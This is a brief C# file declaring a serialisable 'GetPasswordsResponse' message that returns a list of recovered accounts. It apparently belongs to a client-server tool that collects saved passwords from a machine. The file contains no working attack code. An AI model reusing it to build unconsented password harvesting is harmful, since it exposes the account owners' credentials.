using MessagePack;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;
using System.Collections.Generic;

namespace Pulsar.Common.Messages
{
    [MessagePackObject]
    public class GetPasswordsResponse : IMessage
    {
        [Key(1)]
        public List<RecoveredAccount> RecoveredAccounts { get; set; }
    }
}
